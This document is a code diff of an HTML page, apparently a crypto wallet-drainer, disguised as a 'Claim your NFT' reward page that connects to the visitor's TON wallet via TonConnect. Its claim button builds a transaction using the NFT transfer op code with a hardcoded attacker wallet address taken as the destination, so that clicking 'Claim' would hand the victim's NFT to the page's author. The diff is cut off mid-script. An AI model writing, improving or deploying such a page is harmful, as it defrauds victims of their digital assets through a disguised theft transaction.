@@ -1,53 +1,30 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>NFT Claim</title>
+    <title>Claim Reward</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <script src="https://unpkg.com/@ton/core@0.51.0/dist/index.min.js"></script>
-    <style>
-        body { background: #111; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        input { width: 80%; max-width: 400px; padding: 15px; margin: 10px; border-radius: 8px; border: none; }
-        button { padding: 15px 30px; background: #007bff; color: white; border: none; cursor: pointer; border-radius: 8px; font-size: 18px; }
-        .hidden { display: none; }
-    </style>
 </head>
-<body>
-    <div id="generator">
-        <h1>NFT Generator</h1>
-        <input type="text" id="nftInput" placeholder="Вставь ссылку на NFT...">
-        <button onclick="generate()">Сгенерировать ссылку</button>
-    </div>
+<body style="background:#111; color:#fff; text-align:center; padding-top:50px;">
 
-    <div id="claim-box" class="hidden">
-        <h1>Claim your NFT</h1>
-        <div id="ton-connect"></div>
-        <button id="claim-btn" style="background: #28a745; margin-top:20px;">Claim Now</button>
-    </div>
+    <h1>Claim your NFT</h1>
+    <div id="ton-connect"></div>
+    <button id="claim-btn" style="padding:20px; font-size:20px; background:green; color:white; border:none; border-radius:10px; cursor:pointer;">Claim Now</button>
 
     <script>
         const tonConnectUI = new TonConnectUI({ manifestUrl: 'https://newifi.onrender.com/tonconnect-manifest.json' });
         const { beginCell, Address } = window['@ton/core'];
 
-        function generate() {
-            const url = document.getElementById('nftInput').value;
-            const match = url.match(/(EQ|UQ)[a-zA-Z0-9_\-]{46}/g);
-            if (match) {
-                window.location.href = `/?nft=${match[match.length - 1]}`;
-            } else {
-                alert("Не найден адрес NFT!");
-            }
-        }
-
+        // Вытаскиваем адрес из URL
         const params = new URLSearchParams(window.location.search);
         const nftAddress = params.get('nft');
 
-        if (nftAddress) {
-            document.getElementById('generator').classList.add('hidden');
-            document.getElementById('claim-box').classList.remove('hidden');
-        }
-
         document.getElementById('claim-btn').onclick = async () => {
+            if (!nftAddress) {
+                alert("Ошибка: адрес NFT не найден в ссылке.");
+                return;
+            }
+            
             const MY_WALLET = 'UQATIzX89EOOTqfsr8KE64MXvVSa4CGybjwmkPv3-yHbI3ZE';
             const body = beginCell()
                 .storeUint(0x5fcc3d14, 32)
